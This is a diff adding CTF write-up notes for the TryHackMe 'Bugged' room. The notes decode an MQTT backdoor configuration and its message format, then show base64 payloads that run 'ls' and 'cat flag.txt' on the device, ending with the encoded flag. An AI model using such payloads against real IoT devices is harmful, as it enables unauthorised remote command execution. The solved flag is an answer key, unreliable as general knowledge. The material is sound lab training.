@@ -1,6 +1,130 @@
+THM Bugged - Extracted Notes
+
+MQTT Device Telemetry
+
+kitchen/toaster
+
+Topic
+
+kitchen/toaster
+
 {
-"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
-"registered_commands":["HELP","CMD","SYS"],
-"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
-"sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
-}    
+  "id": 11066945492750934780,
+  "in_use": true,
+  "temperature": 156.29333,
+  "toast_time": 265
+}
+
+storage/thermostat
+
+Topic
+
+storage/thermostat
+
+{
+  "id": 429708233957370398,
+  "temperature": 23.06692
+}
+
+Suspicious MQTT Message
+
+{
+  "id": 5397677949173218433,
+  "color": "WHITE",
+  "status": "OFF"
+}
+
+Attached Base64
+
+eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
+
+Decoded Backdoor Configuration
+
+{
+  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
+  "registered_commands": [
+    "HELP",
+    "CMD",
+    "SYS"
+  ],
+  "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
+  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
+}
+
+MQTT Topics
+
+Publisher
+
+U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
+
+Subscriber
+
+XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub
+
+Supported Commands
+
+HELP
+CMD
+SYS
+
+Invalid Message Response
+
+Base64
+
+SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
+
+Decoded
+
+Invalid message format.
+Format: base64({"id":"<backdoor id>","cmd":"<command>","arg":"<argument>"})
+
+Backdoor Message Format
+
+{
+  "id": "<backdoor id>",
+  "cmd": "<command>",
+  "arg": "<argument>"
+}
+
+Backdoor ID
+
+cdd1b1c0-1c40-4b0f-8e22-61b357548b7d
+
+Example Payload (ls)
+
+JSON
+
+{
+  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
+  "cmd": "CMD",
+  "arg": "ls"
+}
+
+Base64
+
+eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==
+
+Response to ls
+
+{
+  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
+  "response": "flag.txt\n"
+}
+
+Example Payload (cat flag.txt)
+
+JSON
+
+{
+  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
+  "cmd": "CMD",
+  "arg": "cat flag.txt"
+}
+
+Base64
+
+eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
+
+Final Encoded Response
+
+eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9
